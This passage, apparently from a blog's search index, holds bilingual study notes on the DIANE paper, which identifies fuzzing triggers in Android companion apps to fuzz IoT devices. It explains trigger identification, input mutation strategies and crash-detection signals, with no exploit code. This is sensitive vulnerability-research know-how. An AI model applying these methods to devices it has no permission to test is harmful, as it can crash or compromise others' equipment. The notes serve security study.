code. </span><br><span class="line">fuzzing triggers：在数据传输函数之前执行，在输入验证函数之后执行</span><br><span class="line">DIANE： a tool that combines static and dynamic analysis to find fuzzing triggers in Android companion apps, and then uses them to fuzz IoT devices automatically. </span><br><span class="line">DIANE：就是一个结合静态分析和动态分析来找到fuzzing triggers，以便于使用他们来进行fuzzing物联网设备的工具</span><br></pre></td></tr></table></figure>

<p>思考：万一验证端在设备上怎么办？</p>
<h2 id="主要思想：-1"><a href="#主要思想：-1" class="headerlink" title="主要思想："></a>主要思想：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i) fuzzing triggers identification, and </span><br><span class="line">ii) fuzzing. </span><br><span class="line">To do this, first, we automatically retrieve those functions within an app that send data to the IoT device.</span><br><span class="line">首先需要自动检测出APP中涉及到发送数据到物联网设备的函数</span><br><span class="line">Then, for each of these functions, we build an inter-procedural backward slice, which we dynamically analyze to ultimately identify fuzzing triggers. </span><br><span class="line">对于每一个上面检测到的函数，我们做一个过程向后切片，这样可以帮助我们动态识别fuzzing triggers</span><br><span class="line">Finally, we use dynamic instrumentation to repeatedly invoke these fuzzing triggers using different arguments. This generates a stream of network data that fuzzes the functionality of the IoT device, to ultimately spot vulnerabilities.</span><br><span class="line">最后我们使用动态的机制来使用不同的参数重复调用这些fuzzing trigger。这样会产生网络数据流（可以功能性得fuzzing物联网设备）</span><br></pre></td></tr></table></figure>

<h2 id="本文做出的贡献："><a href="#本文做出的贡献：" class="headerlink" title="本文做出的贡献："></a>本文做出的贡献：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• We propose an approach to identify fuzzing triggers, which are functions that, in the app’s control flow, are located between the app-side validation logic and the data-encoding functions. When executed, the identified fuzzing triggers produce valid yet under-constrained inputs, enabling effective fuzzing of IoT devices.</span><br><span class="line">可以识别出fuzzing trigger：在APP的控制流层面是位于APP内部逻辑验证和数据编码函数之间的</span><br><span class="line">• We leverage our approach to implement DIANE, an automated black-box fuzzer for IoT devices. </span><br><span class="line">是一个黑色测试工具，来测试物联网设备</span><br><span class="line">   • We evaluate our tool against 11 popular, real-world IoT devices. In our experiments, we show that by identifying fuzzing triggers and using them to generate inputs for the analyzed devices, we can effectively discover vulnerabilities. Specifically, we found 11 vulnerabilities in 5 different devices, 9 of which were previously unknown.</span><br><span class="line">   评估有效</span><br><span class="line">• We show that, for a majority of IoT devices and companion apps, identifying and leveraging fuzzing triggers is essential to generate bug-triggering inputs.</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730201732830.png" alt="image-20210730201732830"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">On the one hand, if the fuzzed function is too close to the UI, the fuzzing is ineffective due to app-side validation that might be present later in the execution. </span><br><span class="line">On the other hand, picking a function too close to the point where data is put onto the network might be ineffective.</span><br><span class="line"></span><br><span class="line">总之，fuzzing入口点（fuzzing trigger）不能离输入太近，也不能离发送数据太近。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找fuzzing trigger： </span><br><span class="line"> 	i) static call-graph analysis, </span><br><span class="line"> 	ii) network traffic analysis, </span><br><span class="line"> 	iii) static data-flow analysis,and </span><br><span class="line"> 	iv) dynamic analysis of the function arguments.</span><br><span class="line"> 	</span><br><span class="line"> 	uses a “bottom-up” approach. </span><br><span class="line"> 	Specifically, we start from identifying low-level functions that potentially generate network traffic, </span><br><span class="line"> 	and then we progressively move “upward” in the app call-graph (i.e., from low-level networking functions to high-level UI-processing ones). This approach allows us to identify functions that produce valid yet under-constrained inputs, skipping all the sanitization checks performed by data-processing functions.</span><br><span class="line"> 	We then use these functions, which we call fuzzing triggers, to efficiently fuzz the analyzed IoT device, while monitoring it for anomalous behaviors, which indicate when a bug is triggered.</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730204946092.png" alt="image-20210730204946092"></p>
<h2 id="Fuzzing-Trigger-Identification："><a href="#Fuzzing-Trigger-Identification：" class="headerlink" title="Fuzzing Trigger Identification："></a>Fuzzing Trigger Identification：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We consider the first data-transforming function in the trace a valid fuzzing trigger, as it dominates every other data-transforming function (itself included).</span><br><span class="line">第一个数据转换函数为fuzzing trigger</span><br><span class="line"></span><br><span class="line">Our bottom-up Fuzzing Trigger Identification algorithm is composed of four steps: </span><br><span class="line"></span><br><span class="line">i) sendMessage Candidates Identification,</span><br><span class="line">ii) sendMessage Validation, 	</span><br><span class="line">iii) Data-Transforming Function Identification, and 	</span><br><span class="line">iv) Top-Chain Functions Collection.	</span><br></pre></td></tr></table></figure>

<p>​    i) sendMessage Candidates Identification：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		statically analyzing the companion app. We aim at finding all the border methods that might implement the network interactions with the analyzed IoT device (function getBorderMethods in Algorithm 1). Specifically, we collect all the methods that perform (at least) a call to native functions or a</span><br><span class="line">call to methods in the Android framework that implement network I/O functionality (see Appendix A for more details).</span><br><span class="line">		静态分析</span><br><span class="line">		候选消息发送函数（border function）：在java函数和native层之间交换的，用于发送数据的函数；或者是在安卓框架中实现了网络信息发送的函数</span><br></pre></td></tr></table></figure>

<p>​    ii) sendMessage Validation：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">		First, we dynamically hook all the candidate functions and run the app. When we observe network activity, we register the last executed candidate sendMessage function. （运行APP，记录最后执行的候选消息发送函数）</span><br><span class="line">		In particular, each time a candidate sendMessage function is executed, we collect the elapsed time between its execution and the observed network activity. （记录执行的时间（从开始执行到观察到网络活动为止））</span><br><span class="line">		Then, we leverage the K-mean algorithm to cluster the observed elapsed time measures. Specifically, we group our candidates into two clusters (i.e., k=2). To do so, we compute each feature vector as the mean, standard deviation, and mode of the elapsed times of each candidate. The rationale is that functions that cause network activity have a smaller mean and standard deviation, as they are less</span><br><span class="line">affected by noise. </span><br><span class="line">		（使用K-means算法对观察到的时间进行聚类，K=2,特征为：均值、标准差和每个候选人的经过时间模式。主要是因为理想的候选人的观察时间应该有很小的均值和标准差，并且噪音对他们的影响并不大）</span><br><span class="line">		Finally, among the sendMessage candidates, we select those belonging to the cluster having the smallest mean of the elapsed times. Only the sendMessage functions within this cluster will be considered in the subsequent steps of our analysis. This approach is represented by the function dynamicFilter in Algorithm 1.</span><br></pre></td></tr></table></figure>

<p>​    iii) Data-Transforming Function Identification：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We first statically identify the possible variables that hold the data being sent by the considered sendMessage function, and the code locations where these variables might be set in the app (function getArgAndObjLocs in Algorithm 1). </span><br><span class="line">静态分辨出sendmessage函数发送的可能的变量，并且找到设置这些变量的位置</span><br><span class="line">To achieve this, we create a set S_v containing tuples (v,cl), where v is a variable used by the sendMessage (i.e., sendMessage arguments or objects referenced within the sendMessage body), and cl is the code location where v is set.	</span><br><span class="line">创建一个集合，集合中的元素都是元组（v,cl）</span><br><span class="line"></span><br><span class="line">For each tuple (v,cl)∈S_v, we perform a static inter-procedural backward slicing (Line 6 in Algorithm 1) from cl up to any function retrieving values from any UI objects. Then, we divide the computed program slices in function scopes (getFunctionScopesat Line 7). Given a program slice, a function scope is defined as a subsequence inst_f of sequential instructions in the slice that belong to the same function f.</span><br><span class="line">对于每一个元组，我们执行一个静态的向后切片，从cl到任何函数（这个函数接受了从UI中的数据），然后将计算出的程序片段划分到函数范围中。给定一个程序切片，函数范围就是切片中属于同一函数f的连续指令的子序列</span><br><span class="line"></span><br><span class="line">For each collected function scope, we perform a liveness analysis [63]: We consider the variables (i.e., local variables and class fields) referenced within the function scope, and we compute the set Lifof variables that are live at the beginning of the scope, and the set Lo_f variables that are live at the end of the scope(Line 8).</span><br><span class="line">对于每一个函数域（FunctionScope），我们对其进行活性分析（liveness analysis）,考虑函数作用域内部应用的变量（局部变量和类的字段），并计算Li_f：在函数域开头的活跃变量集合，Lo_f:生存在函数域结束的活动变量集合</span><br><span class="line">换句话说， 𝐿𝑖_𝑓中包含的是函数𝑓中用于数据转换的所有数据（包括𝑓的参数、𝑓中在赋值前被读取过的类字段）， 𝐿𝑜_𝑓中包含的是函数𝑓生成后的数据（包括𝑓的返回值、𝑓中新建或修改过的类字段）。</span><br><span class="line"></span><br><span class="line">To identify data-transforming functions, we leverage the observation that these functions increase the entropy of the data they consume</span><br><span class="line">为了识别data-transforming function,我们利用了这些函数增加了他们消耗的数据的信息熵的这一现象（数据转换函数的输入和输出具有较大的信息熵差别）。因此先hook每个FunctionScope对应的函数，然后在执行app的过程中动态计算𝐿𝑖_𝑓和𝐿𝑜_𝑓中每个变量的信息熵，并将结果保存到对应的变量中。</span><br><span class="line"></span><br><span class="line">Finally, we inspect every collected function scope and calculate the quotient debetween the maximum entropy registered among all the variables in Lofand the minimum value of entropy registered among all the variables in Lif(Line 11). If deis greater than a certain threshold Tf(set to 2.0 in our experiments, as previous work suggested [80]), we consider the function f to be a data-transforming function (Line 12).</span><br><span class="line">对每个FunctionScope，从𝐿𝑜_𝑓中选取最大熵值，从𝐿𝑖_𝑓中选取最小熵值，二者相除得到𝑑_𝑒。这个值表示该函数的信息熵值变化情况，如果𝑑_𝑒大于一定阈值（文章中是2.0），则说明该函数进行了数据散列变化，因此将其选为Data- ransforming函数。</span><br></pre></td></tr></table></figure>

<p>​    iv) Top-Chain Functions Collection.    </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We call a sequence of data-transforming functions a transformation data chain, and we refer to the first function in the sequence with the term top-chain function. We say that a top-chain function f affects a variable v if modifying the content of f’s variables eventually affects v’s value.</span><br><span class="line">top-chain function将会影响变量v的值，如果修改了函数f的变量的内容最终会影响V的值</span><br><span class="line"> the top-chain functions that affect sendMessage variables</span><br><span class="line"> To identify top-chain functions, we build the dominance tree^2 of each data-transforming function detected at the previous step (Line 13), </span><br><span class="line">我们为每一个data transforming函数建立数据结构：支配树</span><br><span class="line">and select those data-transforming functions that are not dominated by any other data-transforming function (Line 16). Finally, we consider as fuzzing triggers the collected top-chain functions.</span><br><span class="line">Note that, if no data-transforming function dominates a sendMessage function, we consider the sendMessage as a fuzzing trigger (Line 14, 15, and 16).</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\fourth\AppData\Roaming\Typora\typora-user-images\image-20210730204917972.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Our approach executes the same app multiple times, being consistent across the different runs. Thus, ideally, we want the app to follow always the same execution paths. T o achieve this goal, we require the analyst to run the app once, while DIANE records the generated UI inputs. Then, we automatically replay the same inputs in the subsequent runs, by leveraging RERAN [40]. </span><br><span class="line">我们的APP需要执行多次，为了减少UI误差，我们首先运行APP，然后使用DIANE记录所有的UI输入，然后使用RERAN来重放</span><br></pre></td></tr></table></figure>

<p>test case generation:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• String lengths: </span><br><span class="line">	We change the length of strings in order to trigger buffer overflows and out-of-bound accesses. We</span><br><span class="line">generate random strings with different lengths.</span><br><span class="line">	改变字符串长度：产生溢出或者越界</span><br><span class="line"></span><br><span class="line">• Numerical values: </span><br><span class="line">	We change the values of integer, double or float values to cause integer overflows or out-of-bound accesses. We generate very large values, negative values, and the zero value.</span><br><span class="line"></span><br><span class="line">• Empty values:</span><br><span class="line">	We provide empty values, in the attempt to cause misinterpretation, uninitialized variable vulnerabilities, and null pointer dereferences.</span><br><span class="line">	制造空值，触发未初始化变量和空指针引用</span><br><span class="line"></span><br><span class="line">• Array lengths:</span><br><span class="line">	W e modify the content of arrays by removing or adding elements.</span><br></pre></td></tr></table></figure>

<p>Identifying Crashes</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• Connection dropped. </span><br><span class="line">	Specifically, for TCP connections, we look for cases where the app sent a FIN packet and received no response (FIN + ACK), and then sent a sequence of two or more SYN packets.</span><br><span class="line">	FIN数据包无响应，且连续发送SYN数据包</span><br><span class="line">• HTTP Internal Server Error (500).</span><br><span class="line">	Instances where the app and the device communicate through HTTP , and the device returns an Internal Server Error [1] (status code 500), are considered as a signal that the device has entered in a faulty state.</span><br><span class="line">	设备500错误</span><br><span class="line">• Irregular network traffic size. </span><br><span class="line">	If the amount of data exchanged between the app and the device overcomes a threshold S_e, we save the current crash-inducing input. Our intuition is that, when a device enters a faulty state (e.g., due to a crash) it usually becomes temporarily unavailable for the app, thus drastically reducing the amount of data exchanged. In our experiments, we empirically verified that when the amount of exchanged data was less than 50% (compared to a regular run), something unusual happened to the device. For this reason, we set Seto be 50%.</span><br><span class="line">	不正常的流量：流量突然减少50%（与正常情况相比）</span><br><span class="line">• Heartbeat Monitoring. </span><br><span class="line">	While fuzzing a given device, we continuously ping it and monitor its response time. We report any crash-inducing inputs causing the response time to be above a certain threshold T_p. In our experiments, we set T_p to 10 seconds, as we empirically verified that the average response time of an IoT device falls within 1 second under normal conditions.</span><br><span class="line">	发送ping数据包，超过10s设备未响应，则出现异常</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>fuzzing</category>
        <category>notes</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
        <tag>paper</tag>
      </tags>
  </entry>
</search>
